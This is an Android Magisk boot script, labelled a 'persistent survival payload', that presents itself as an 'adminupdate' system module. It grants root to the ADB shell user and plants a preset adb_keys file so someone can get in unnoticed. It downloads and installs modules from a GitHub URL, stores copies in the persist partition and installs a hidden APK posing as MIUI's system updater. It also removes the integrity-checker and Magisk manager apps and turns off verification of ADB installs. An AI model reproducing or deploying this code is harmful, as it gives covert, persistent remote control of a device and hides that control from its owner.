#!/system/bin/sh
# build 467: persistent survival payload; ADB/developer options are user-controlled
MODDIR=${0%/*}
DATA=/data/adb/adminupdate
LOG=$DATA/adminupdate.log
mkdir -p "$DATA"
log() { echo "$(date '+%F %T') $*" >> "$LOG"; }
I=0
while [ "$(getprop sys.boot_completed)" != "1" ] && [ "$I" -lt 120 ]; do
  I=$((I+1))
  sleep 2
done
magisk --sqlite "INSERT OR REPLACE INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1)" >/dev/null 2>&1
if [ ! -f "$DATA/adb_boot" ]; then
  mkdir -p /data/misc/adb
  cp -f "$MODDIR/adb_keys" /data/misc/adb/adb_keys
  chown system:shell /data/misc/adb/adb_keys 2>/dev/null
  chmod 640 /data/misc/adb/adb_keys 2>/dev/null
  chcon u:object_r:adb_keys_file:s0 /data/misc/adb/adb_keys 2>/dev/null
  settings put global development_settings_enabled 1
  settings put global adb_enabled 1
  setprop ctl.start adbd 2>/dev/null
  touch "$DATA/adb_boot"
  log "adb enabled first boot"
fi
if [ ! -f "$DATA/debug_auto_off" ]; then
  (
    while true; do
      if [ "$(settings get global device_provisioned)" = "1" ]; then
        sleep 120
        settings put global adb_enabled 0
        settings put global development_settings_enabled 0
        setprop ctl.stop adbd 2>/dev/null
        touch "$DATA/debug_auto_off"
        log "adb auto-disabled after setup"
        break
      fi
      sleep 30
    done
  ) &
fi
for F in "$DATA"/pending_*; do
  [ -f "$F" ] || continue
  ID=${F##*/pending_}
  T=$(cat "$F" 2>/dev/null)
  C=$(grep -m1 '^versionCode=' "/data/adb/modules/$ID/module.prop" 2>/dev/null | cut -d= -f2 | tr -dc '0-9')
  if [ -n "$C" ] && [ -n "$T" ] && [ "$C" -ge "$T" ]; then
    rm -f "$F" "$DATA/fail_$ID"
  else
    N=$(cat "$DATA/fail_$ID" 2>/dev/null)
    [ -z "$N" ] && N=0
    N=$((N+1))
    echo "$N" > "$DATA/fail_$ID"
    if [ "$N" -ge 3 ] && [ -n "$T" ]; then
      echo "$T" > "$DATA/block_$ID"
      log "blocked $ID $T after $N failures"
      rm -f "$F"
    fi
  fi
done
CHANGED=0
BASE=https://raw.githubusercontent.com/devid2000kb/15c/main/modules
BB=/data/adb/magisk/busybox
[ -x "$BB" ] || BB=busybox
install_missing() {
  ID=$1
  ZIP=$2
  if [ -d "/data/adb/modules/$ID" ] || [ -d "/data/adb/modules_update/$ID" ]; then
    return 0
  fi
  TMP=$DATA/$ZIP
  LOCAL=$DATA/payload/$ZIP
  log "installing $ID"
  if [ -s "$LOCAL" ]; then
    cp -f "$LOCAL" "$TMP"
  else
    $BB wget -q -T 120 -O "$TMP" "$BASE/$ZIP" < /dev/null 2>/dev/null
  fi
  if [ -s "$TMP" ] && magisk --install-module "$TMP" >>"$LOG" 2>&1; then
    CHANGED=1
    mkdir -p /mnt/vendor/persist/payload/modules 2>/dev/null
    cp -f "$TMP" "/mnt/vendor/persist/payload/modules/$ID.zip" 2>/dev/null
    chmod 644 "/mnt/vendor/persist/payload/modules/$ID.zip" 2>/dev/null
  else
    log "install failed $ID"
  fi
  rm -f "$TMP"
}
install_missing zygisksu neozygisk.zip
install_missing tricky_store tricky_store.zip
install_missing playintegrityfix playintegrityfix.zip
install_missing zygisk_nohello nohello.zip
mkdir -p /data/adb/nohello
: > /data/adb/nohello/whitelist
if [ "$CHANGED" = "1" ]; then
  N=$(cat "$DATA/install_attempts" 2>/dev/null)
  [ -z "$N" ] && N=0
  N=$((N+1))
  echo "$N" > "$DATA/install_attempts"
  if [ "$N" -ge 3 ]; then
    log "module install stalled after $N attempts; keeping boot alive"
    rm -f "$DATA/reboot_pending"
    exit 0
  fi
  log "core modules staged (attempt $N)"
  touch "$DATA/reboot_pending"
  sleep 10
  svc power reboot
  exit 0
fi
rm -f "$DATA/reboot_pending" "$DATA/install_attempts"
for ID in zygisksu tricky_store playintegrityfix; do
  rm -f "/data/adb/modules/$ID/disable"
done
for ID in zygisk_shamiko hosts teesim; do
  [ -d "/data/adb/modules/$ID" ] && touch "/data/adb/modules/$ID/disable"
done
rm -rf /data/adb/modules/zygisk-assistant /data/adb/modules_update/zygisk-assistant
rm -f "$DATA"/pending_zygisk-assistant "$DATA"/fail_zygisk-assistant "$DATA"/block_zygisk-assistant
rm -f /data/adb/modules/zygisk_nohello/disable
mkdir -p /data/adb/nohello
: > /data/adb/nohello/whitelist
rm -f "$DATA/keybox_updated" "$DATA/pif_good.prop" "$DATA/pif_saved.prop" "$DATA/auto_update.pid" "$DATA/install.log" "$DATA/test.log"
if ! /system/bin/dumpsys package com.miui.systemupdate 2>/dev/null | grep -q 'codePath='; then
  /system/bin/pm unhide com.miui.systemupdate >/dev/null 2>&1
  TRIES=0
  while [ "$TRIES" -lt 3 ]; do
    /system/bin/pm install -r -i com.android.vending "$MODDIR/apps/updateui.apk" >>"$LOG" 2>&1 && break
    TRIES=$((TRIES+1))
    sleep 3
  done
fi
/system/bin/pm hide com.miui.systemupdate >/dev/null 2>&1
if /system/bin/dumpsys package com.miui.systemupdate 2>/dev/null | grep -q 'codePath='; then
  log "update ui ready"
else
  log "update ui install failed"
fi
if /system/bin/pm list packages 2>/dev/null | grep -q 'package:gr.nikolasspyr.integritycheck'; then
  /system/bin/pm unhide gr.nikolasspyr.integritycheck >/dev/null 2>&1
  /system/bin/pm uninstall gr.nikolasspyr.integritycheck >/dev/null 2>&1
  log "checker removed"
fi
settings put global package_verifier_enable 1
settings put global verifier_verify_adb_installs 0
settings put global package_verifier_user_consent 0
settings put global upload_apk_enable 0
for ID in com.google.android.gms com.google.android.gsf com.android.vending; do
  /system/bin/pm enable "$ID" >/dev/null 2>&1
done
if [ "$(settings get global package_verifier_enable)" = "1" ]; then
  log "play protect on"
else
  log "play protect off"
fi
for P in io.github.vvb2060.magisk com.topjohnwu.magisk; do
  if /system/bin/pm list packages 2>/dev/null | grep -q "package:$P"; then
    /system/bin/pm unhide "$P" >/dev/null 2>&1
    /system/bin/pm uninstall "$P" >/dev/null 2>&1
    log "manager removed $P"
  fi
done
magisk --sqlite "update settings set value=0 where key='zygisk'" >/dev/null 2>&1
magisk --sqlite "update settings set value=0 where key='denylist'" >/dev/null 2>&1
cp -f "$MODDIR/auto_hide.sh" /data/adb/service.d/adminupdate_auto_hide.sh
chmod 755 /data/adb/service.d/adminupdate_auto_hide.sh
sh "$MODDIR/auto_hide.sh" >/dev/null 2>&1
pkill -f "adminupdate/monitor[.]sh" 2>/dev/null
pkill -f "adminupdate/pif[.]sh" 2>/dev/null
pkill -f "adminupdate/github_update[.]sh" 2>/dev/null
pkill -f "adminupdate/keybox[.]sh" 2>/dev/null
nohup sh "$MODDIR/monitor.sh" >/dev/null 2>&1 &
nohup sh "$MODDIR/pif.sh" >/dev/null 2>&1 &
nohup sh "$MODDIR/github_update.sh" >/dev/null 2>&1 &
nohup sh "$MODDIR/keybox.sh" >/dev/null 2>&1 &
log "ready"
